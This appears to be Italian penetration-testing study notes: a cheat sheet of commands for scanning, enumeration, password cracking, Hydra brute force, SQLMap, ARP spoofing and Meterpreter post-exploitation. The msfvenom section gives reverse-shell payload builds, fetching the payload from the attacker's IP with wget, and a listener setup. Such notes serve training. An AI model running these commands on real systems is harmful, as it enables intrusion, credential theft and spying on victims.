[Blue Team Tools for Hackers _compressed (1).pdf](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f46adb7-7950-4f75-92a1-803289993db5/e7f3b664-69e0-4a54-8af2-c5828f975eeb/Blue_Team_Tools_for_Hackers__compressed_(1).pdf)

![Screenshot_20240323_095903_LinkedIn](https://github.com/user-attachments/assets/d84aa977-690d-43e5-a7a1-1e7a0a34b5e5)


# Enumerazione

## **NMAP o zedmap**

**CARTELLA SCRIPT** **/usr/share/nmap/scripts.**

--script NOME_SCRIPT attiva script

--script=vulv attiva tutti gli script della categoria vulnerabilità

**nmap** scannerizza le 100 porte piu comuni

### **OPZIONI**

**--top-ports** scannerizza le prima 500 porte piu comuni.

-**-open** stampa e scannerizza solo le porte aperte

**-p** puoi indicare la porta singolarmente o il range di porte **n-n**

**-O** Enumerazione sistema operativo target

**-oA** salva i risultati di nmap in 3 file con estensioni diverse  .txt/.xml/.gnmap

-**oN** nome_file_output.txt <target> L’utente specifica su che tipo di file salvare la scan

**-oG** salva la scan in un formato facilemte analizzabile dagli script e strumenti di ricerca

**-sT** TCP connect scan

-**sU** UDP connec scan

**-sS** SYN scansione TCP

**-v (verbouse)** stamperà a schermo mano a mano che trova porte

-**vv** piu verboso

**-n** non risolve i DNS 

**-Pn** Tratta gli host come se fossero online

**-sN** scansione silenziosa NULL session

**-sF** scanzione silenziona con un flag FIN

**-sX** scanzione silenzionsa con pacchetto TCP malformato

**-sV** darà la versione del servizio

**-sC** probabili vulnerabilità

**-f** fa sì che la scansione richiesta (comprese le scansioni ping) utilizzi piccoli pacchetti IP frammentati. 

--**mtu VALORE**

**–iL** (input list) dice ad nmap di eseguire l’input all’interno di un file

**--min-rate 5000** Imposta la velocità minima della scansione a 5000 pacchetti al secondo. Questo accelera la scansione, ma può anche aumentare la probabilità di essere rilevati da sistemi di rilevamento delle intrusioni (IDS).

**-T (tempo)** che va da o-5 

![Untitled](https://github.com/user-attachments/assets/68167ed6-1f7b-447d-a9ac-9fe0a7ca0cb8)


### **PER OS FINGERPRINTIG**

**-O** trova il sistema operativo (utilizzato per OS fingerprint)

**nmap –Pn –O IP** tratta il target come se fosse attivo

**-osscan-limit**: stima i sistemi operativi dei soli target più promettenti, ovvero di quei target

**-osscan-guess**: prova a **stimare** i **OS** in maniera più «avventata», fornendo stime **approssimative**/**aggressive**, basate su **informazioni** non complete.

**-sN IP_CIDR** Trovare tutti i device connessi sulla stessa rete

### **PER ENUMERAZIONE DI SERVIZI**

-**A** enumerazione avanzata dei servizi

- **nmap –sV -sT -IP**
- **nmap IP_TARGET --switch smb-os-discovery**  ottinene info aggiuntive (utile su windows)
- **nmap –sS/-sT/-sV TARGET_DOMINIO.COM**
- **nmap –sS/-sT/-sV 192.168.1.123 192.168.23.11** liste di indirizzi IP
- **nmap –sS/-sT/-sV IP_TARGET/24** subnet in notazione CIDR:
- **nmap –sS/-sT/-sV 192.168.2.*** Wildcard
- **nmap –sS/-sT/-sV 192.168.2.1-55** Intervalli da ping 192.168.2.1 a 192.168.2.55
- **nmap –sS/-sT/-sV –iL FILE.txt** file in input
- **nmap –sS/-sT/-sV–p 53,443,80,135** [target.dominio.com](http://target.dominio.com/) lista porte da scannerizzare
- **nmap –sS/-sT/-sV –p 1-1024** [target.dominio.com](http://target.dominio.com/) range porte da scannerizzare
- **nmap –sS/-sT/-sV –p 1-53,100 192.168.*.10** X assume tutti i risultati ammessi, scansione sulle porte [da1 a 53] e sulla porta 100.
- **nmap IP_TARGET --source-port 80** nmap invia i pacchetti al target tramite la porta 80 (non rilevabile da IDS/IPS)
- **nmap IP_TARGET --source-port 443** uguale ma HTTPS

### **PER I PING**

- **nmap –sn TARGET_ip/CIDR**’
- -**sn** indica che deve scansionare l’host senza inviare pacchetti di ping (si è invisibili)
- **nmap –sn 192.168.1.1-150** pinga gli ip nel range
- **nmap –sn 192.168.1.*** prende tutti gli ip
- **nmap –sn –iL file_ip.txt**  riportiamo lo scan dentro un file

### **ESEMPI**

- **nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount IP_TARGET**
    - enumerazione servizio rpcbind port 111
- **nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP_TARGET**
    - enumerazione delle share sfruttando SMB port 445
- **nmap -A -sV --open -O -Pn -sC -vv IP > nmapscan.txt**
    - input standard per information gathering
- **nmap -p- --open -v -T5 IP_TARGET**
- **nmap --top-ports N_PORTE IP_TARGET** scannerizza le prima 500 porte piu comuni.
- **nmap --top-ports N_PORTE --open IP_TARGET** scannerizza le prima 500 porte piu comuni aperte
- **nmap -p- INDIRIZZO_IP_DA_ATTACCARE** scannerizza tutte le porte
- **nmap -p- --open IP_TARGET** scannerizza tutte le porte e fa vedere solo quelle aperte
- **nmap IP_TARGET -v -p- -sV --reason --dns-server ns** spiega il motivo di una porta aperta, chiusa o filtrata e perchè l’host è contrassegnato come vivo
- **nmap -f --mtu=512 IP_TARGET**
- **-p- --open -sS --min-rate 5000 -vvv -n -Pn IP_TARGET -oG scan**
    - **-p-** scan tutte le porte
    - **--open** visualizza solo le porte aperte
    - **-sS** SYN, scan silenzione
    - **--min-rate 5000** Imposta la velocità minima della scansione a 5000 pacchetti al secondo. Questo accelera la scansione, ma può anche aumentare la probabilità di essere rilevati da sistemi di rilevamento delle intrusioni (IDS).
    - **-vvv** per mostrare le porte appena trovate
    - **-n** senza risoluzione del DNS per risparmiare 2 minuti
    - **-Pn** no Host discovery per velocizzare lo scan,Viene utilizzato quando si sa che l'host è attivo o quando i ping sono bloccati da firewall.
    - -**oG** scan salva su un file chiamato scan

## NBTSTAT

(E’ un tools per la shell di Windows, permette di enumerare i file in share su windows)

- **nbtstat /?** apre il manuale
- **nbtstat -A IP_TARGET** visualizza info sul target
- **NET VIEW IP_TARGET** enumerare gli share quando l’attaccante sa che il file server è attivo

## The Harvester

per enumerazione email

- **theHarvester -d DOMAIN_NAME -l 100 -b FONTE,ALTRA FONTE** (es: google,linkedin)
    - -**d** target dominio
    - -**l** (L minuscola) massimo 100 risultati
    - **-b** fonte da cui prendere i dati

## nmblookup

enumerare le share di windows tramite la shell di linux

1 tool

- **nmblookup -A IP_TARGET** visualizza info sul ip target
- **nmblookup --help** apre il manuale

2 tool smbclient (enumerazione di **share** **amministrative** e non di un host)

- **smbclient -L //IP_TARGET -N**
    - **-L** permette di visualizzare quali servizi sono disponibili sul target
    - **//**, l’indirizzo IP deve essere preceduto da due slash
    - **-N**, fa in modo che il tool non chieda una password
- **smbclient //IP_TARGET/SHARENAME -N** per capire se fare un attacco bisogna collegarsi ad una shere con questo comando

## WHOIS

- **whois IP_TARGET**
    - permette di avere tanti dati per l’enumerazione

## Traceroute

- **traceroute IP_DESTINATION**
    - Visualizza i nodi, i server che attraversa un pacchetto per arrivare a destinazione

# Vulnerability scanner

## VPScan

Vulnerability Scanner per WordPress gratuito

- **wpscan --url URL**
- **wpscan --url URL enumerate vp** enumerazione vulnerabilità plugins
- **wpscan --url URL enumerate vt** enumerazione vulnerabilità Themes
- **wpscan --url URL enumerate u** enumerazione users

### **searchsploit**

- **searchsploit VERSIONE** trova exploit per quella determinata versione del servizio
- **searchsploit -m EXPLOIT_TROVATO** salviamo il nostro exploit nella directory dove ci troviamo
    - **`m`**: Opzione che indica di copiare l'exploit in un file nella directory corrente.
    - **EXPLOIT_TROVATO**: Il percorso dell'exploit nel database di Exploit Database.

## Nessus

- **sudo systemctl start nessusd.service** fa partire nessus dalla shell
- [https://kali:8834](https://kali:8834/) Una volta che il servizio è stato avviato dal browser ci colleghiamo cosi

# Cracking password

Attacchi bruteforce a dizionario per enumerazione Web

## Jhon the Ripper Bruteforce

Bisogna unire i file di password contenente gli utenti con il file degli hash delle password e lo faremo con il comando **unshadow**  presente su jhon 

**Sui sistemi Linux questi due file sono:**

- /etc/passwd
- /etc/shadow

comando:

- **unshadow PASSWORD_FILE SHADOW_FILE> hashes.txt** usato per imput a JtR
- **john --incremental --users= «nome_utente» «file_unito»** per craccare la pass di un silgolo utente
- **john --show <file_unito>** visualizza le pass trovate

## Jhon the Ripper Dizionario

- **-**-**wordlist** serve per far capire di lanciare attacco a dizionario
- **john --wordlist=/usr/share/john/wordlist.txt FILE_UNITO** lancia l’attacco utilizzando uno specifico dizionario

## ophcrack

Tool utilizzato per crackare le pass windows

Sul sito **ufficiale** si possono **trovare** le **rainbow table gratuite** la cui dimensione varia da poche centinaia di MB fino a diversi TB.

- Caricare dal Tables le tabelle rainbow
- caricare il file password su Load
- Crack per avviare il processo

## Raimbow crack

Craccare le password via rainbow table senza limitazioni di sistema operativo.

- **rcrack -h**

# Crack di Zip File

## Zip

ZIPPARE FILE O DIRECOTORY

- **zip -r FILE.zip NOME_FILE_DA ZIPPARE** comprimerà e zipperà il file o directory
- **unzip NOME_FILE** unzippa il file
- **zip --encrypt FILE.zip FILE_DA_ZIPPARE.txt**. permette di zippare proteggendo il file con password

## **CRACKARE FILE ZIPPATI SENZA DIZIONARIO**

**fcrackzip -b FILE.zip -u -c a1 -l 4**

- **b** – Selezionare l'opzione per un attacco di forza bruta.
- **FILE.zip** – The file we want to brute-force.
- **u** –  fa sì che fcrackzip tenti effettivamente di decomprimere il file, senza il quale non si otterrà la password giusta.
- **c** – Qui si scelgono i caratteri da utilizzare per l'attacco del dizionario. In questo esempio utilizzeremo 'a', che rappresenta le lettere minuscole, e '1', che rappresenta i numeri da 0 a 9.
- **l** – Qui si indica la lunghezza della password che si vuole decifrare. Se sappiamo che la password è compresa tra 4 e 6 caratteri, useremo "-l 4-6".

## Crackstation

è un sito che trasforma le password criptate da algoritmi in parole leggibili.

## [**CRACKARE FILE ZIPPATI CON DIZIONARIO**](https://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html)

‘**fcrackzip -D -u -p DIRECTORY_DIZIONARIO FILE.zip** 

- **D** – Selezionare l'opzione per un attacco a dizionario.
- **u** – Questo fa sì che fcrackzip tenti effettivamente di decomprimere il file, senza il quale non si otterrà la password giusta./usr/share/wordlists/rockyou.txt.gz
- **p** – Utilizzare le stringhe come password.
- **/usr/share/wordlists/rockyou.txt** – Questa è la posizione della nostra lista di parole, necessaria per eseguire un attacco a dizionario.
- FILE_DA_CRACCARE.zip – The file we want to crack.

# Attacco ai sistemi

## Meterpreter

- **help**

**Comandi principali**

- **`background`**: Sfondi della sessione corrente
- **`exit`**: Termina la sessione di Meterpreter
- **`guid`** Ottieni il GUID (Globally Unique Identifier) della sessione
- **`help`**: Visualizza il menu di aiuto
- **`info`**: Visualizza informazioni su un modulo Post
- **`irb`**: Apre una shell Ruby interattiva sulla sessione corrente
- **`load`**: Carica una o più estensioni Meterpreter
- **`migrate`**: consente di migrare Meterpreter su un altro processo
- **`run`**: Esegue uno script Meterpreter o un modulo Post
- **`sessions`**: Passa rapidamente a un'altra sessione

**Comandi del file system**

- **cd** spostarsi tra directory
- **ls** elencherà i file nella directory corrente
- **pwd** stampa la directory corrente
- **edit** permette di modificare un file
- **cat** mostrerà il contenuto di un file
- **rm** elimina file
- **search** cercherà file
- **upload** caricherà file o direcotry
- **download** scaricherà file o directory

**Comandi di rete**

- **arp** visualizza la cache ARP(address resolution protocol) dell’host
- **ifconfig** visualizza interfaccia di rete sul sitema di destinazione
- **netstat** visualizza le connessione di rete
- **portfwd** inoltra una porta locale a un servizio remoto
- **route** consente di visualizzare e modificare la tabella di routing

**Comandi di sistema**

- **clearev** cancella i registri degli eventi
- **execute** esegue un comando
- **getpid** mostra l’identificativo del processo corrente
- **getuid** mostra all’utente che Meterpreter è in esecuzione come
- **kill** termina un processo
- **pkill**  termina il processo in base al nome
- **ps** elena i processi in esecuzione
- **reboot** riavvia il computer
- **shell** si inserisce in una shell di comando di sistema
- **shutdown** spegne il compute remoto
- **sysinfo** ottiene informazioni sul sistema remoto, come il sistema operativo

**Altri comandi**

- **idletime** Restituisce il numero di secondi in cui l’utente remoto è stato inattivo
- **keyscan_dump** Svuota il buffer dei tasti premuti
- **keyscan_start** Inizia a catturare le sequenze di tasti
- **keyscan_stop** Interrompere la cattura delle sequenze di tasti
- **screenshare** consente di guardare il desktop dell’utente remoto in tempo reale
- **screenshot** cattura uno screenshot
- **record_mic** Cattura l’audio dal microfono predefinito per X secondi
- **webcam_chat** avvia una video chat
- **webcam_list** elenca le webcam
- **webcam_stream** riproduce cosa sta guardando la webcam
- **getsystem** tentativi di elevare il tuo a quello del sistema locale
- **hashdump** scarica il contenuto del database SAM (Il database SAM memorizza le password degli utenti sui sistemi Windows. Queste password sono memorizzate nel formato NTLM

## SQLMap

(sql injection)

- **sqlmap -u URL -p INJECTION_PARAMETER OPTIONS**
    - -**u**, specifica l’URL da testare
    - -**p**, il parametro da testare (possiamo **anche** utilizzare SQLMap in **modalità** completamente **automatica**, e lasciare che sia il tool a trovare i punti di iniezione vulnerabili)
    - **options**, permette di specificare varie opzioni come ad esempio la tecnica di injection da utilizzare
- **sqlmap -u URL --data=POST_STRINGA -p PARAMENER OPTIONS** utilizzato per il verbo post
    - **--data**, che deve essere seguito dalla stringa POST. Considerate che può essere **recuperato intercettando** una **richiesta** con **BurpSuite**.

## Hydra

cracking di servizi di autentificazione come: 

FTP, HTTP, IMAP, RDP, SMB, SSH, Cisco Auth.

- **hydra** apre Il **manuale**
- **hydra –L user.txt –P pass.txt «servizio://server» [opzioni]** Esempio sintassi di attacco a dizionario.
- **hydra -U rdp** visualizza Info su un determinato modulo
- **hydra –L users.txt –P pass.txt http-get://localhost** Attacco autenticazione HTTP su localhost
- **hydra –L users.txt –P pass.txt [ftp://192.168.1.150](ftp://192.168.1.150/)** Attacco autenticazione ftp su IP 192.168.1.150
- **hydra –L users.txt –P pass.txt telnet://192.168.1.150** Attacco autenticazione telnet su 192.168.1.150
- **hydra –l username –p password 192.168.1.150 –t4 ssh** Attacco autenticazione SSH su porta standard 22
- **hydra –s 55 –l username –p password 192.168.1.150 –t4 ssh** Attacco SSH  specificando la porta 55 con il parametro –s. Il parametro –t4 viene utilizzato per ridurre il numero di task paralleli

Se vogliamo utilizzare i dizionari presenti su seclist Installare [seclists](https://www.kali.org/tools/seclists/) con sudo **apt install seclists**

- **hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt IP_TARGET -t4 SSH**

## SAMBA

1 tool **nmblookup**

- **nmblookup -A IP_TARGET** visualizza info sul ip target
- **nmblookup --help** apre il manuale

2 tool **smbclient** (enumerazione di **share** **amministrative** e non di un host)

- **smbclient //IP_TARGET/USER**
    - per accedere come utente, (puoi usare anche anonymous)
- **smbclient -L //IP_TARGET -N**
    - **`L`**: Elenca le cartelle condivise disponibili su un server.
    - **`10.10.10.3`**: L'indirizzo IP del server SMB di destinazione.
    - **`N`**: Non richiede una password. Questa opzione viene utilizzata quando il server SMB consente l'accesso anonimo
- **smbclient //IP_TARGET/DIRECTORY-N** si collega alla share senza una richiesta di username e password
- **Help** compare la lista di comandi che possiamo utilizzare all’interno di smb

## NBTSTAT

E’ un tools per la **shell** di **Windows** utilizza la vulnerabilità NULL session attaccando **l’autenticazione** delle **share amministrative**

- **nbtstat /?** apre il manuale
- **nbtstat -A IP_TARGET** visualizza info sul target
- **net view IP_TARGET** Quando un **attaccante sa che** una macchina ha il **servizio** di file **Server attivo**, può **enumerare** gli share **utilizzando**

## msfvenom

- **msfvenom --list formats** utilizzato per elencare i formati di output supportati

Creazione di reverse shell per different device

- Windows: **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f exe > rev_shell.exe**
- Linux**: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf**
- PHP: **msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.php**
- ASP: **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f asp > rev_shell.asp**
- Python: **msfvenom -p cmd/meterpreter/reverse_python LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.py**
- **msfconsole** **`use exploit/multi/handler`** Multi Handler per ricevere la connessione in arrivo. Il modulo può essere utilizzato con il

### Creazione server condivisione file Python

- **python3 -m http.server 9000** creazione python web server per trasferire la shell

### Accesso con credenziali ssh

- **ssh username@targetIP**
    - inserire password

### Caricamento del payload sulla macchina vittima

- **wget http://MIO_IP:porta/FILE_SHELL**
- **chmod +x FILE_SHELL** Cambio di permessi sul payload

### MSFCONSOLE

- **use exploit/multi/handler** è il modulo in ascolto sulla macchina attaccante per funzionare come handler (per catturare la shell).
    - set lhost, lport and run

### RUN THE SHELL

- **./rev_shell.elf**  avviarlo nella sessione della vittima

# Sniffing

## **NETCAT**

**nc -nlvp NUMERO_PORTA**  fare da server per aprire e mettersi in ascolto su di una porta

-**n** viene utilizzato per specificare che non è necessario risolvere l'indirizzo IP tramite DNS.

**nc IP_DI_CHI_HA_APERTO_PORTA NUMERO_PORTA** mettersi in ascolto sulla porta aperta dal server

**nc IP_TARGET PORTA** 

**HEAD / HTTP/1.0** restituisce l’header Http per il fingerprintig

## Wireshark

Sniffig avviato

**La sintassi dei filtri è molto semplice:** <protocollo>.<proprietà> <operatore_di_confronto> <valore>

- **tcp && tcp.porta == 80** traffico TCP e pacchetti che utilizzano la porta 80
- **ip.addr==INDIRIZZO_IP** filtra pacchetti di questo indirizzo ip
- **tcp/dns/arp/http/icmp** mostra il protocollo selezionato
- **PROTOCOLLO and PROTOCOLLO** mostra i pacchetti che hanno entrambi i protocolli
- **PROTOCOLLO or PROTOCOLLO** mostra i pacchetti che hanno uno dei due protocolli
- **tcp.port == 443**
- **tcp.analysis.flags** filtra i pacchetti persi o con problemi
- **!(arp or icmp or dns)** rimuove dai filtri i pacchetti contenenti questi protocolli
- **follow tcp stream** si può fare con il tasto dentro sul pacchetto
- **tcp contains "facebook"** anche con altri protocolli ovviamente
- **http contains “password”**
- **http.request** filtra tutte le richieste http (GET,POST,HEAD,DELETE,PUT,OPTIONS, etc)
- **http.response.code == 200** filtra per le OK
- **tcp.flags.syn == 1** seleziona i pacchetti TCP che stanno tentando di iniziare una connessione TCP, in quanto hanno il flag SYN impostato a 1.
- **tcp.flags.reset == 1** filtra i problemi di connessione, errori di comunicazione o altri eventi rilevanti.

## Tcpdump

- **-D** visualizza le rete disponibili per la cattura
- **`A`** to display packet contents in ASCII
- **`x`** to print the hex dump of the packet
- **`X`** to print both of the above, and
- **`t`**, **`tt`**, **`ttt`**, **`tttt`**, **`ttttt`** to manage timestamps
- **-i NOME_INTERFACCIA** cattura i pacchetti solo su quella interfaccia
- **-c n** indica il numero di pacchetti da catturare.
- **--count** conta il numero dei pacchetti
- **src port** indica il filtro della porta sorgente da sniffare
- **dst port** indica il filtro della porta di destinazione da sniffare
- **and** è l’operatole logico
- **src IP** è il filtro che specifica l’host sorgente dei pacchetti
- **dst IP** è il filtro che specifica l’host di destinazione dei pacchetti
- **-n** disattiva la risoluzione dei nomi sugli indirizzi IP e sulle porte
- -**w** salva la cattura su file PCAP
- **ftp** filtra i pacchetti con protocollo ftp
- **-r FILENAME** salva la cattura su file .PCAP
- **-v/-vv/-vvv** in base alle v aumenta la verbosità
- **sudo tcpdump -i tun0 icmp -n**    mettiamoci in ascolto sulla nostra rete
    - **`i tun0`**: Specifica l'interfaccia di rete `tun0` su cui catturare i pacchetti. `tun0` è tipicamente utilizzata per le interfacce di tunnel, come quelle utilizzate da VPN.
    - **`icmp`**: Filtra il traffico catturato per includere solo i pacchetti ICMP.
    - **`n`**: Non risolve gli indirizzi IP in nomi host mostrando solo gli indirizzi IP numerici.
- **tcp[tcpflags] == tcp-ack**/**tcp-syn**/**tcp-fin**/**tcp-push**/**tcp-urg**/**tcp-rst** per filtrare i pacchetti che hanno tutti questi flags
- **tcp[tcpflags] == tcp-push** per filtrare i pacchetti che hanno solo questo flag
- **tcpdump -r NOME_FILE.pcap | cut -d “>” -f 1**  permette di visualizzare solo i primi 3 dati dei pacchetti, ora, protocollo Layer 3, indirizzo e porta di origine
- **tcpdump -r NOME_FILE.pcap | cut -d “:” -f 1,2,3** specifica piu campi da visualizzareg
- **tcpdump -r NOME_FILE.pcap | awk ‘{print $7***.***}’ | tr -d “,” | head** filtra solo i flag (**awk estrae un singolo dato da tutti i pacchetti)**
- **tcpdump -r NOME_FILE.pcap | grep zip -v -i** -v tutto tranne la parola chiave. -i senza distinzione tra maiuscole e minuscole
- **tcpdump ‘tcp[13] & 32 != 0’** Show me all URGENT (`URG`) packets
- **tcpdump ‘tcp[13] & 16 != 0’** Show me all ACKNOWLEDGE (`ACK`) packets
- **tcpdump ‘tcp[13] & 8 != 0’** Show me all PUSH (`PSH`) packets..
- **tcpdump ‘tcp[13] & 4 != 0’** Show me all RESET (`RST`) packets...
- **tcpdump ‘tcp[13] & 2 != 0’**  Show me all SYNCHRONIZE (`SYN`) packets...
- **tcpdump ‘tcp[13] & 1 != 0’** Show me all FINISH (`FIN`) packets...
- **tcpdump ‘tcp[13] & 18 != 0’** Show me all SYNCHRONIZE/ACKNOWLEDGE (`SYNACK`) packets.
- ***tcpdump -r NOME_FILE.pcap -vvv | grep -i chrome** mostra dettagli dei pecchetti contenete chrome (-i senza distinzione tra maiuscole e minuscole)*
- ***tcpdump -v -r NOME_FILE.pcap | grep “ttl 38” | wc -l**  mostra il numero di pacchetti che contengono ttl 38*
- ***tcpdump ip[8] == 38 -r NOME_FILE.pcap --count** uguale a sopra*
- ***tcpdump -A -r NOME_FILE.pcap | grep png** cattura file png*
- ***tcpdump -vv -r NOME_FILE.pcap | grep OpenSSH** cattura i pacchetti openssh con una verbosità aumentata*
- ***tcpdump -A -r NOME_FILE.pcap | grep .zip -B 3**  mostra il file .zip (-B 3 mostra anche le tre righe precedenti a ciascuna riga contenente ".zip")*

## arpspoof

(ARP Poisoning, permette di sniffare i pacchetti tramite protocollo ARP

si deve abilitare prima **dsniff**

## [dsniff](https://www.kali.org/tools/dsniff/)

E’ una **collezione** di **tool** per il **network auditing** e **penetration testing**. Al suo interno **contiene** l’utility **arpspoof**, un’utility progettata per **intercettare** il **traffico** su una **LAN basata** **su** **switch**.

(ARP Poisoning) abilita ip_forward su kali per trasformare il cp in router)

- **echo 1 > /proc/sys/net/ipv4/ip_forward**

---

- **arpspoof -i INTERFACCIA -t TARGET -r HOST**
    - **-i,** ci permette di specificare l’interfaccia di rete, ad esempio la nostra eth0 o eth1, o altro nome dipendentemente dalla vostra configurazione
    - Target, Host, sono gli indirizzi delle vittime dell’arpspoof
    
    A questo punto possiamo **attivare Wireshark**
    

# Steganografia

## **STEGHIDE**

- `steghide embed -cf FILE_ESCA.TXT -ef FILE_DA_NASCONDERE.zip`incorpora sovrascrivendo il file di destinazione con quello da nascondere
- `steghide embed -cf FILE_ESCA.TXT -ef FILE_DA_NASCONDERE.zip -sf NOME_NUOVO_FILE.jpg` incorpora e crea un nuovo file
    - **embed**  da l’opzione di incorporare
    - -**cf** permette di selezionare il file copertina
    - **-ef** permette di selezionare il file da incorporare
    - -**sf** permette di incorporare il file segreto in un nuovo file
- **steghide extract -sf NOME_FILE_DA_ESTRARRE** permette di estrarre un file coperto con steganografia

# Crittografia

## **md5sum(**meno utilizzato) ****e **sha256sum**

Creare Hash di un file, utile per threat hunting

- Da Windows **Get-FileHash <nomefile>**
- Da Kali **sha256sum NOME_FILE**
    - **md5sum NOME_FILE**

# OSINT

## [**SITO PER TROVARE TOOLS OASINT FACILEMTE**](https://osintframework.com/)

# Utility

## **NETCAT**

- **nc -nlvp NUMERO_PORTA**  fare da server per aprire e mettersi in ascolto su di una porta
- -**n** viene utilizzato per specificare che non è necessario risolvere l'indirizzo IP tramite DNS.
- **nc IP_DI_CHI_HA_APERTO_PORTA NUMERO_PORTA** mettersi in ascolto sulla porta aperta dal server
- **nc IP_TARGET PORTA**

**HEAD / HTTP/1.0** restituisce l’header Http per il fingerprintig

## openSSL

- **openssl s_client –connect IP_TARGET:PORTA**
    - **-s_client** indica che noi facciamo da clien
    - -**connect** Utilizzato per connettersi all’ip:porta

## Httprint

**httprint –P0 –h «host» –s «file_di_firme»**

- -**P0**, indica al comando di **non inviare ping all’host**.
- **-h**, serve a specificare all’interno del comando **l’host target**
- **-s**, server per **impostare** il **file** di **firme** (s sta per **signature**) da utilizzare

## Iptables

- **iptables -I (i maiuscola) CHAIN -p PROTOCOLLO —dport NUMERO_PORTA -j AZIONE**
- **iptables –I INPUT –p tcp --dport 22 –j ACCEPT** aggiunge una regola che permette la connessione SSH di input
- **iptables –I INPUT –p tcp –s 192.168.0.2 --dport 80 –j DROP** rigettare il traffico in entrata sulla porta 80 dall’indirizzo ip 192.168.0.2
    - -**I** (i maiuscola) inserisci nuova regola
    - -**p**: specifica il protocollo (TCP/UDP)
    - **--dport**: specifica la porta di destinazione
    - -**j**: specifica l’action da mettere in pratica
    - -**s**: specifica l’ip sorgente

# [DarkGPT](https://www.redhotcyber.com/post/darkgpt-larma-segreta-nelle-attivita-di-penetration-test-e-di-cyber-threat-intelligence/)

ĽArma Segreta nelle attività di Penetration Test e di Cyber-Threat Intelligence
